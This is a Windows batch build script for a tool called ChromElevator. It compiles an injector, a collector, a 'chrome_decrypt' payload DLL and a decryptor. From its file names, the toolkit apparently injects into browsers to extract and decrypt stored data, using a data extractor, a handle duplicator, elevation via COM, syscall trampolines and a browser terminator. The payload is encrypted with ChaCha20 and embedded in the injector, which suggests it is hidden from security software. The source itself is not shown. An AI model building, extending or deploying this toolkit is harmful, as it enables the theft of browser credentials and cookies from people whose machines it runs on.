@echo off
setlocal enabledelayedexpansion

:: =============================================================================
:: ChromElevator Build System (x64 / ARM64 only) – with Decryptor
:: Target OS: Windows 7 SP1 and above (no CreateFile2, no Win8+ APIs)
:: =============================================================================

:: --- Architecture sanity check ---
if "%VSCMD_ARG_TGT_ARCH%"=="" (
    echo [!] This script must be run from a Visual Studio Developer Command Prompt.
    exit /b 1
)
if /i not "%VSCMD_ARG_TGT_ARCH%"=="x64" if /i not "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
    echo [!] Requires x64 or ARM64 prompt. Current: %VSCMD_ARG_TGT_ARCH%
    exit /b 1
)

:: --- Architecture-specific flags ---
if /i "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
    set "ASM_CMD=armasm64.exe -nologo"
    set "ASM_SRC_FILE=syscall_trampoline_arm64.asm"
    set "LFLAGS_MACHINE=/MACHINE:ARM64"
) else (
    set "ASM_CMD=ml64.exe /nologo /c"
    set "ASM_SRC_FILE=syscall_trampoline_x64.asm"
    set "LFLAGS_MACHINE=/MACHINE:X64"
)

:: --- Directories ---
set "BUILD_DIR=build"
set "SRC_DIR=src"
set "LIBS_DIR=libs"
set "FINAL_EXE_NAME=chromelevator.exe"
set "COLLECTOR_EXE_NAME=collector.exe"
set "DECRYPTOR_EXE_NAME=decryptor.exe"
set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
set "COLLECTOR_PAYLOAD_DLL_NAME=collector_payload.dll"
set "ENCRYPTOR_EXE_NAME=encryptor.exe"
set "PAYLOAD_HEADER=payload_data.hpp"
set "COLLECTOR_PAYLOAD_HEADER=collector_payload_data.hpp"

:: -----------------------------------------------------------------------------
:: Win7 compatibility defines
:: -----------------------------------------------------------------------------
set "COMPAT_DEFINES=/D_WIN32_WINNT=0x0601 /DWINVER=0x0601 /DNTDDI_VERSION=0x06010000 /D_USING_V110_SDK71_"

:: --- Compiler flags ---
set "CFLAGS_COMMON=/nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GL /GR- /Gw /Zc:threadSafeInit- %COMPAT_DEFINES%"
set "CFLAGS_CPP=/std:c++17 /EHsc"
set "CFLAGS_SQLITE=/nologo /W0 /O1 /Os /MT /GS- /Gy /GL /DSQLITE_OMIT_LOAD_EXTENSION %COMPAT_DEFINES%"

:: --- Linker flags ---
set "LFLAGS_COMMON=/NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /INCREMENTAL:NO %LFLAGS_MACHINE%"
set "LFLAGS_MERGE=/MERGE:.rdata=.text"

:: Static CRT libs required when /MT is used with /GL + LTCG
set "STATIC_CRT=libvcruntime.lib libucrt.lib libcmt.lib"

if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"

:: --- Dispatch based on first argument ---
if "%1"=="clean"                 goto :clean
if "%1"=="build_encryptor_only"  goto :build_encryptor_only
if "%1"=="build_target_only"     goto :build_target_only
if "%1"=="build_decryptor_only"  goto :build_decryptor_only
:: default – full build
goto :full_build

:: =============================================================================
:: TOP‑LEVEL BUILD TARGETS
:: =============================================================================

:full_build
call :compile_sqlite
if %errorlevel% neq 0 exit /b 1
call :compile_payload
if %errorlevel% neq 0 exit /b 1
call :compile_encryptor
if %errorlevel% neq 0 exit /b 1
call :encrypt_payload
if %errorlevel% neq 0 exit /b 1
call :compile_injector
if %errorlevel% neq 0 exit /b 1
call :compile_collector_payload
if %errorlevel% neq 0 exit /b 1
call :encrypt_collector_payload
if %errorlevel% neq 0 exit /b 1
call :compile_collector
if %errorlevel% neq 0 exit /b 1

echo [FULL] Building Decryptor...
call :compile_decryptor
if %errorlevel% neq 0 exit /b 1

goto :done

:clean
echo Cleaning build directory...
if exist "%BUILD_DIR%" rd /s /q "%BUILD_DIR%"
if exist "%FINAL_EXE_NAME%"    del /q "%FINAL_EXE_NAME%"
if exist "%COLLECTOR_EXE_NAME%" del /q "%COLLECTOR_EXE_NAME%"
if exist "%DECRYPTOR_EXE_NAME%" del /q "%DECRYPTOR_EXE_NAME%"
echo Clean complete.
goto :eof

:build_encryptor_only
call :compile_sqlite
call :compile_crypto
echo [E] Compiling Encryptor (standalone)...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /Fe"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    "%SRC_DIR%\sys\tools\encryptor.cpp" "%BUILD_DIR%\chacha20.obj" ^
    /link %LFLAGS_COMMON% bcrypt.lib %STATIC_CRT%
if %errorlevel% neq 0 exit /b 1
echo Encryptor built: %BUILD_DIR%\%ENCRYPTOR_EXE_NAME%
goto :eof

:build_target_only
call :compile_sqlite
call :compile_payload
call :compile_encryptor
call :encrypt_payload
call :compile_injector
goto :done

:build_decryptor_only
echo [D] Building Decryptor (standalone)...
call :compile_decryptor
if %errorlevel% neq 0 exit /b 1
echo [+] %DECRYPTOR_EXE_NAME% ready.
goto :eof

:: =============================================================================
:: SHARED SUBROUTINES
:: =============================================================================

:compile_sqlite
echo [1/5] Compiling SQLite3...
cl %CFLAGS_SQLITE% /c "%LIBS_DIR%\sqlite\sqlite3.c" /Fo"%BUILD_DIR%\sqlite3.obj" 2>nul
if %errorlevel% neq 0 exit /b 1
lib /NOLOGO /LTCG /OUT:"%BUILD_DIR%\sqlite3.lib" "%BUILD_DIR%\sqlite3.obj" >nul
if %errorlevel% neq 0 exit /b 1
goto :eof

:compile_crypto
if not exist "%BUILD_DIR%\chacha20.obj" (
    echo Compiling ChaCha20...
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\chacha20.cpp" /Fo"%BUILD_DIR%\chacha20.obj"
    if %errorlevel% neq 0 exit /b 1
)
goto :eof

:compile_payload
echo [2/5] Compiling Payload DLL...
call :compile_crypto
cl %CFLAGS_COMMON% /std:c++17 /EHs-c- /c "%SRC_DIR%\sys\bootstrap.cpp" /Fo"%BUILD_DIR%\bootstrap.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\payload_main.cpp" /Fo"%BUILD_DIR%\payload_main.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\com\elevator.cpp" /Fo"%BUILD_DIR%\elevator.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\pipe_client.cpp" /Fo"%BUILD_DIR%\pipe_client.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\data_extractor.cpp" /Fo"%BUILD_DIR%\data_extractor.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\aes_gcm.cpp" /Fo"%BUILD_DIR%\aes_gcm.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\handle_duplicator.cpp" /Fo"%BUILD_DIR%\handle_duplicator.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api_payload.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /c "%SRC_DIR%\payload\extra_extractor.cpp" /Fo"%BUILD_DIR%\extra_extractor.obj"
if %errorlevel% neq 0 exit /b 1

%ASM_CMD% /Fo"%BUILD_DIR%\syscall_trampoline_payload.obj" "%SRC_DIR%\sys\%ASM_SRC_FILE%"
if %errorlevel% neq 0 exit /b 1

link %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" ^
    "%BUILD_DIR%\payload_main.obj" "%BUILD_DIR%\bootstrap.obj" "%BUILD_DIR%\elevator.obj" ^
    "%BUILD_DIR%\pipe_client.obj" "%BUILD_DIR%\data_extractor.obj" "%BUILD_DIR%\extra_extractor.obj" ^
    "%BUILD_DIR%\aes_gcm.obj" "%BUILD_DIR%\chacha20.obj" "%BUILD_DIR%\handle_duplicator.obj" ^
    "%BUILD_DIR%\internal_api_payload.obj" "%BUILD_DIR%\syscall_trampoline_payload.obj" ^
    "%BUILD_DIR%\sqlite3.lib" ^
    bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib ^
    crypt32.lib advapi32.lib kernel32.lib user32.lib ^
    wlanapi.lib rpcrt4.lib ncrypt.lib %STATIC_CRT%
if %errorlevel% neq 0 exit /b 1

if not exist "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" (
    echo [-] Payload DLL was not created!
    exit /b 1
)
goto :eof

:compile_encryptor
echo [3/5] Compiling Encryptor...
call :compile_crypto
cl %CFLAGS_COMMON% %CFLAGS_CPP% /Fe"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    "%SRC_DIR%\sys\tools\encryptor.cpp" "%BUILD_DIR%\chacha20.obj" ^
    /link %LFLAGS_COMMON% bcrypt.lib %STATIC_CRT%
if %errorlevel% neq 0 exit /b 1
goto :eof

:encrypt_payload
echo [4/5] Encrypting Payload + Generating Embedded Header...
if not exist "%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" (
    echo [-] Encryptor missing, cannot encrypt payload.
    exit /b 1
)
"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.enc" "%BUILD_DIR%\%PAYLOAD_HEADER%"
if %errorlevel% neq 0 exit /b 1
if not exist "%BUILD_DIR%\%PAYLOAD_HEADER%" (
    echo [-] Header file was not created.
    exit /b 1
)
goto :eof

:compile_injector
echo [5/5] Compiling Injector (chromelevator.exe)...
call :compile_crypto
%ASM_CMD% /Fo"%BUILD_DIR%\syscall_trampoline.obj" "%SRC_DIR%\sys\%ASM_SRC_FILE%"
if %errorlevel% neq 0 exit /b 1

cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_main.cpp"    /Fo"%BUILD_DIR%\injector_main.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp"   /Fo"%BUILD_DIR%\process_manager.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp"        /Fo"%BUILD_DIR%\pipe_server.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp"           /Fo"%BUILD_DIR%\injector.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp"            /Fo"%BUILD_DIR%\internal_api.obj"
if %errorlevel% neq 0 exit /b 1

link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
    "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
    "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
    "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
    "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
    "%BUILD_DIR%\syscall_trampoline.obj" ^
    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib %STATIC_CRT%
if %errorlevel% neq 0 exit /b 1

if not exist ".\%FINAL_EXE_NAME%" (
    echo [-] Injector EXE was not created!
    exit /b 1
)
goto :eof

:: =============================================================================
:: Collector payload DLL
:: =============================================================================
:compile_collector_payload
echo Compiling Collector Payload DLL...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%LIBS_DIR%\sqlite" /I"%SRC_DIR%\payload" /c "%SRC_DIR%\collector\collector_payload.cpp" /Fo"%BUILD_DIR%\collector_payload.obj"
if %errorlevel% neq 0 exit /b 1

cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\com\elevator.cpp"    /Fo"%BUILD_DIR%\elevator.obj"
if %errorlevel% neq 0 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\bootstrap.cpp"   /Fo"%BUILD_DIR%\bootstrap_collector.obj"
if %errorlevel% neq 0 exit /b 1

if not exist "%BUILD_DIR%\pipe_client.obj" (
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\pipe_client.cpp" /Fo"%BUILD_DIR%\pipe_client.obj"
    if %errorlevel% neq 0 exit /b 1
)
if not exist "%BUILD_DIR%\extra_extractor.obj" (
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\extra_extractor.cpp" /Fo"%BUILD_DIR%\extra_extractor.obj"
    if %errorlevel% neq 0 exit /b 1
)
if not exist "%BUILD_DIR%\handle_duplicator.obj" (
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\handle_duplicator.cpp" /Fo"%BUILD_DIR%\handle_duplicator.obj"
    if %errorlevel% neq 0 exit /b 1
)
if not exist "%BUILD_DIR%\aes_gcm.obj" (
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\aes_gcm.cpp" /Fo"%BUILD_DIR%\aes_gcm.obj"
    if %errorlevel% neq 0 exit /b 1
)
if not exist "%BUILD_DIR%\chacha20.obj" (
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\chacha20.cpp" /Fo"%BUILD_DIR%\chacha20.obj"
    if %errorlevel% neq 0 exit /b 1
)
if not exist "%BUILD_DIR%\internal_api_payload.obj" (
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api_payload.obj"
    if %errorlevel% neq 0 exit /b 1
)
if not exist "%BUILD_DIR%\syscall_trampoline_payload.obj" (
    %ASM_CMD% /Fo"%BUILD_DIR%\syscall_trampoline_payload.obj" "%SRC_DIR%\sys\%ASM_SRC_FILE%"
    if %errorlevel% neq 0 exit /b 1
)

link %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\%COLLECTOR_PAYLOAD_DLL_NAME%" ^
    "%BUILD_DIR%\collector_payload.obj" "%BUILD_DIR%\elevator.obj" "%BUILD_DIR%\bootstrap_collector.obj" ^
    "%BUILD_DIR%\pipe_client.obj" "%BUILD_DIR%\extra_extractor.obj" "%BUILD_DIR%\handle_duplicator.obj" ^
    "%BUILD_DIR%\aes_gcm.obj" "%BUILD_DIR%\chacha20.obj" "%BUILD_DIR%\internal_api_payload.obj" ^
    "%BUILD_DIR%\syscall_trampoline_payload.obj" "%BUILD_DIR%\sqlite3.lib" ^
    bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib ^
    crypt32.lib advapi32.lib kernel32.lib user32.lib ^
    wlanapi.lib rpcrt4.lib ncrypt.lib %STATIC_CRT%
if %errorlevel% neq 0 exit /b 1
goto :eof

:encrypt_collector_payload
echo Encrypting Collector Payload + Generating Embedded Header...
"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    "%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_DLL_NAME%" ^
    "%CD%\%BUILD_DIR%\collector_payload.enc" ^
    "%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%"
if %errorlevel% neq 0 exit /b 1
if not exist "%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%" (
    echo [-] Header file missing after encryption.
    exit /b 1
)
goto :eof

:compile_collector
echo Compiling Collector injector...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /DCOLLECTOR_BUILD /I"%LIBS_DIR%" /I"%CD%\%BUILD_DIR%" ^
    /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector_collector.obj"
if %errorlevel% neq 0 exit /b 1

cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%CD%\%BUILD_DIR%" /FI"%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%" ^
    /c "%SRC_DIR%\collector\collector_main.cpp" /Fo"%BUILD_DIR%\collector_main.obj"
if %errorlevel% neq 0 exit /b 1

link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%COLLECTOR_EXE_NAME%" ^
    "%BUILD_DIR%\collector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
    "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
    "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector_collector.obj" ^
    "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
    "%BUILD_DIR%\syscall_trampoline.obj" ^
    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib %STATIC_CRT%
if %errorlevel% neq 0 exit /b 1

if not exist ".\%COLLECTOR_EXE_NAME%" (
    echo [-] Collector EXE was not created!
    exit /b 1
)
goto :eof

:: =============================================================================
:: Decryptor (standalone, Win7-compatible) – only ONE version of this routine
:: =============================================================================
:compile_decryptor
echo [DECR] Compiling Decryptor...
if not exist "%SRC_DIR%\decryptor\decryptor_main.cpp" (
    echo [-] ERROR: Source file not found: %SRC_DIR%\decryptor\decryptor_main.cpp
    exit /b 1
)

cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" ^
    /c "%SRC_DIR%\decryptor\decryptor_main.cpp" /Fo"%BUILD_DIR%\decryptor_main.obj"
if %errorlevel% neq 0 (
    echo [-] ERROR: Compilation of decryptor_main.cpp failed!
    exit /b 1
)

if not exist "%BUILD_DIR%\decryptor_main.obj" (
    echo [-] ERROR: Object file not created: %BUILD_DIR%\decryptor_main.obj
    exit /b 1
)

link %LFLAGS_COMMON% /OUT:".\%DECRYPTOR_EXE_NAME%" ^
    "%BUILD_DIR%\decryptor_main.obj" ^
    bcrypt.lib crypt32.lib advapi32.lib kernel32.lib user32.lib %STATIC_CRT%
if %errorlevel% neq 0 (
    echo [-] ERROR: Linking of decryptor_main.obj failed!
    exit /b 1
)

if not exist ".\%DECRYPTOR_EXE_NAME%" (
    echo [-] ERROR: Decryptor EXE was not created: %DECRYPTOR_EXE_NAME%
    exit /b 1
)
echo [DECR] Decryptor built successfully.
goto :eof

:: =============================================================================
:: FINISH
:: =============================================================================
:done
echo.
echo =============================================================================
echo [+] Build Complete
if exist ".\%FINAL_EXE_NAME%"    echo     - %FINAL_EXE_NAME%
if exist ".\%COLLECTOR_EXE_NAME%" echo    - %COLLECTOR_EXE_NAME%
if exist ".\%DECRYPTOR_EXE_NAME%" echo    - %DECRYPTOR_EXE_NAME%
echo =============================================================================
echo.
echo Cleaning intermediate files...
del /q "%BUILD_DIR%\*.obj"  2>nul
del /q "%BUILD_DIR%\*.lib"  2>nul
del /q "%BUILD_DIR%\*.exp"  2>nul
del /q "%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%"          2>nul
del /q "%BUILD_DIR%\%PAYLOAD_HEADER%"              2>nul
del /q "%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%"    2>nul
echo [+] Cleaned intermediate files.
echo.
echo Retained: %FINAL_EXE_NAME%, %COLLECTOR_EXE_NAME%, %DECRYPTOR_EXE_NAME%, %BUILD_DIR%\*.dll, %BUILD_DIR%\*.enc
goto :eof